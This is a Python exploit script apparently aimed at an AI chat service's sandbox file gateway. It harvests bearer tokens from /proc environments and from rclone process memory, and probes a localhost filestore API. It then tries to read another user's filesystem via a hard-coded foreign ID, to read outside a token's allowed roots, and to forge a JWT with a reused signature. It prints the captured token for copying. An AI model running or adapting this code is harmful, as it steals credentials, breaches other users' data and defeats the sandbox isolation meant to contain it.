#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.6.0 -- local filestore gateway on 127.0.0.1:9112 -> real proof."""
import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
import urllib.request, urllib.error, urllib.parse

VER = "2.6.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
OUT, G = [], {}
def w(s=""):
    print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        evidence: " + str(ev)[:700])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(args, timeout=45, env=None):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout, env=env)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def http(method, url, token=None, timeout=8, data=None, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER}
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(8192)
    except urllib.error.HTTPError as e:
        try: b = e.read(4096)
        except Exception: b = b""
        return e.code, b
    except Exception as e:
        return None, str(e).encode()
def step(name, fn):
    try: fn()
    except Exception as e:
        w("    !! section %s crashed: %s" % (name, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])

# ---- reuse: config / fsids / tokens ----
def s_config():
    head("config")
    G["CONF"] = "/dev/shm/rclone-boot/config.json"
    conf = json.loads(open(G["CONF"]).read())
    G["service_url"] = conf.get("service_url") or "https://api.anthropic.com"
    for m in conf.get("mounts", []):
        if m.get("filesystem_id"): G["config_fsid"] = m["filesystem_id"]
    rec("P", "config readable", G.get("config_fsid"))

def s_fsids():
    head("fsids")
    FS = []
    def add(x):
        x = (x or "").strip()
        if x.startswith("claude_chat_") and x not in FS: FS.append(x)
    add(G.get("config_fsid")); add("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
    for v in list(os.environ.values()):
        for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): add(m)
    G["FSIDS"] = FS
    for x in FS: w("    " + x)

def s_tokens():
    head("tokens")
    try:
        o = os.listdir("/mnt/user-data/outputs")
        if o:
            try: open("/mnt/user-data/outputs/" + o[0], "rb").read(2048)
            except Exception: pass
    except Exception: pass
    time.sleep(1.5)
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK = []
    def addtok(t):
        t = t.decode() if isinstance(t, bytes) else t
        t = t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
        except Exception: pass
    pids = []
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" in open("/proc/%s/cmdline" % p, "rb").read(): pids.append(p)
        except Exception: pass
    for pid in pids:
        try: maps = open("/proc/%s/maps" % pid).read().splitlines()
        except Exception: continue
        try: mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
        except Exception: continue
        for line in maps:
            try: rng, perms = line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a, b = rng.split("-"); s0 = int(a,16); e0 = int(b,16)
            except Exception: continue
            if e0-s0 <= 0 or e0-s0 > 256*1024*1024: continue
            try: mem.seek(s0); d = mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD = []
    for t in TK:
        try:
            h, p, s = t.split(".")
            TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"] = TD
    def pick(root):
        for r in TD:
            if root in (r["pl"].get("allowed_roots") or []): return r
        return None
    G["T_OUT"] = pick("/outputs"); G["T_UPL"] = pick("/uploads"); G["T_TRA"] = pick("/transcripts")
    G["TOKEN"] = (G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
    for r in TD: w("    roots=%s ro=%s" % (r["pl"].get("allowed_roots"), r["pl"].get("readonly")))
    rec("P" if TD else "F", "tokens n=%d" % len(TD))
    try:
        for e in os.listdir("/mnt/user-data/outputs"):
            if e.endswith((".txt",".json",".md")): G["FN"] = e; break
    except Exception: pass
    w("    proof file: %s" % G.get("FN"))

def s_ports():
    head("local ports")
    for port in [9112, 2024, 2025, 5572, 9430, 8080]:
        try:
            c = socket.create_connection(("127.0.0.1", port), timeout=2); c.close()
            w("    OPEN 127.0.0.1:%d" % port)
        except Exception as e:
            w("    closed %d (%s)" % (port, e))

def s_api():
    head("local filestore gateway API")
    BASE = "http://127.0.0.1:9112"
    METHODS = ["listDirectory","readFile","getFileMetadata","listFiles","stat",
               "getFilesystem","getFilesystemUsage","createFile","writeFile",
               "moveFile","copyFile","removeFile","importFiles","reassignFilesystem"]
    FSID = G["FSIDS"][0]
    WORK = None
    for m in METHODS:
        url = BASE + "/v1/filestore/fs/" + m
        st, b = http("GET", url, token=G.get("TOKEN"))
        w("    GET  %-18s -> %s %r" % (m, st, b[:180]))
        if st is not None and st != 404: WORK = WORK or (m, "GET", None)
        st, b = http("POST", url, token=G.get("TOKEN"), data=b"{}",
                     hdrs={"Content-Type": "application/json"})
        w("    POST %-18s -> %s %r" % (m, st, b[:180]))
    # with explicit params
    for m in ["listDirectory","readFile","getFileMetadata"]:
        q = urllib.parse.urlencode({"filesystem_id": FSID, "path": "/"})
        st, b = http("GET", BASE + "/v1/filestore/fs/%s?%s" % (m, q), token=G.get("TOKEN"))
        w("    GET-q %-16s -> %s %r" % (m, st, b[:180]))
        st, b = http("POST", BASE + "/v1/filestore/fs/" + m, token=G.get("TOKEN"),
                     data=json.dumps({"filesystem_id": FSID, "path": "/"}).encode(),
                     hdrs={"Content-Type": "application/json"})
        w("    POST-j %-15s -> %s %r" % (m, st, b[:180]))
        msg = urllib.parse.quote(json.dumps({"filesystem_id": FSID, "path": "/"}))
        st, b = http("GET", BASE + "/v1/filestore/fs/%s?connect=v1&encoding=json&message=%s" % (m, msg),
                     token=G.get("TOKEN"), hdrs={"Connect-Protocol-Version": "1"})
        w("    CONNECT %-14s -> %s %r" % (m, st, b[:180]))
    # no-auth control
    st, b = http("GET", BASE + "/v1/filestore/fs/listDirectory", token=None)
    w("    GET (no token) -> %s %r" % (st, b[:150]))
    G["API_BASE"] = BASE
    rec("P" if WORK else "F", "gateway reachable=%s" % bool(WORK))

def s_dump():
    head("rclone --dump headers (exact request)")
    R = None
    for c in ["/opt/rclone/rclone-filestore","/opt/rclone/rclone"]:
        if os.path.exists(c): R = c; break
    rc, out, err = sh([R, "help", "backend", "rclone-filestore"])
    w("    --- rclone help backend rclone-filestore (rc=%s) ---" % rc)
    for ln in (out or err).splitlines()[:50]: w("    | " + ln)
    env = os.environ.copy()
    env["RCLONE_CONFIG_FS_TYPE"] = "rclone-filestore"
    env["RCLONE_CONFIG_FS_SERVICE_URL"] = G["service_url"]
    env["RCLONE_CONFIG_FS_FILESYSTEM_ID"] = G["FSIDS"][0]
    rc, out, err = sh([R,"-vv","--dump","headers","ls","fs:/outputs"], timeout=45, env=env)
    w("    --- request trace ---")
    for ln in err.splitlines():
        if any(k in ln for k in ["/v1/filestore","Authorization","Bearer","Host:","HTTP/1","connect=","message="]):
            w("    | " + ln[:260])

def s_proof():
    head("PROOF: read a real file via the gateway")
    BASE = G.get("API_BASE", "http://127.0.0.1:9112"); FSID = G["FSIDS"][0]
    FN = G.get("FN") or "x"
    def call(method, payload, token, style="post"):
        url = BASE + "/v1/filestore/fs/" + method
        if style == "post":
            return http("POST", url, token=token, data=json.dumps(payload).encode(),
                        hdrs={"Content-Type": "application/json"})
        return http("GET", url + "?" + urllib.parse.urlencode(payload), token=token)
    for m in ["readFile", "getFileMetadata"]:
        for path in ["/outputs/" + FN, FN]:
            for style in ("post","get"):
                st, b = call(m, {"filesystem_id": FSID, "path": path}, G.get("TOKEN"), style)
                w("    %s %s %s -> %s %r" % (m, style, path, st, b[:160]))
                if st is not None and st < 400 and b:
                    G["READ_OK"] = (m, path, style)
    if G.get("READ_OK"): rec("P", "file read through gateway", G["READ_OK"])
    else: rec("U", "readFile shape not yet matched (see error bodies above)")

def s_boundary():
    head("BOUNDARY PROOF (F1 cross-fsid / F2 allowed_roots / F3 forgery)")
    BASE = G.get("API_BASE", "http://127.0.0.1:9112")
    if not G.get("READ_OK"): rec("U", "skipped (no successful read)"); return
    m, path, style = G["READ_OK"]
    def call(p, token, fsid=None):
        pl = {"filesystem_id": fsid or G["FSIDS"][0], "path": p}
        url = BASE + "/v1/filestore/fs/" + m
        if style == "post":
            return http("POST", url, token=token, data=json.dumps(pl).encode(),
                        hdrs={"Content-Type": "application/json"})
        return http("GET", url + "?" + urllib.parse.urlencode(pl), token=token)
    st, b = call(path, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:70]))
    # F2: /uploads readonly token reading /transcripts
    if G.get("T_UPL"):
        for p2 in [path.replace("/outputs","/transcripts"), path.replace("/outputs","/uploads")]:
            st, b = call(p2, G["T_UPL"]["tok"])
            w("    [F2] uploads-token -> %s : %s %r" % (p2, st, b[:60]))
            if st is not None and st < 400: rec("P", "F2 readonly token read outside its root", p2)
    # F1: foreign fsid
    if len(G["FSIDS"]) > 1:
        st, b = call(path, G.get("TOKEN"), fsid=G["FSIDS"][1])
        w("    [F1] foreign fsid %s -> %s %r" % (G["FSIDS"][1], st, b[:60]))
        if st is not None and st < 400: rec("P", "F1 read FOREIGN filesystem", G["FSIDS"][1])
    # F3: forged token
    if G.get("TOKEN") and len(G["FSIDS"]) > 1:
        h, p, s = G["TOKEN"].split(".")
        pl = json.loads(b64d(p)); hd = json.loads(b64d(h))
        pl2 = dict(pl); pl2["filesystem_id"] = G["FSIDS"][1]; pl2["allowed_roots"] = ["/"]
        forged = b64e(json.dumps(hd).encode()) + "." + b64e(json.dumps(pl2).encode()) + "." + s
        st, b = call(path, forged, fsid=G["FSIDS"][1])
        w("    [F3] forged token -> %s %r" % (st, b[:60]))
        if st is not None and st < 400: rec("P", "F3 signature NOT verified", st)

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P), P))
    w("  FAIL %d: %s" % (len(F), F))
    w("  UNKNOWN %d: %s" % (len(U), U))
    if G.get("TOKEN"):
        w("\n  >>> COPY THESE <<<")
        w("  FSID=%s" % G["FSIDS"][0])
        w("  TOKEN=%s" % G["TOKEN"])
        if len(G.get("FSIDS",[])) > 1: w("  FOREIGN_FSID=%s" % G["FSIDS"][1])
    w("  GATEWAY=%s/v1/filestore/fs/" % G.get("API_BASE","http://127.0.0.1:9112"))

def main():
    for n, f in [("config",s_config),("fsids",s_fsids),("tokens",s_tokens),
                 ("ports",s_ports),("api",s_api),("dump",s_dump),
                 ("proof",s_proof),("boundary",s_boundary),("verdict",s_verdict)]:
        step(n, f)

try:
    main()
except Exception as e:
    w("!! main crashed: %s" % e); w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in SINKS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
        except Exception: pass
    print("\nwritten: " + ", ".join(SINKS))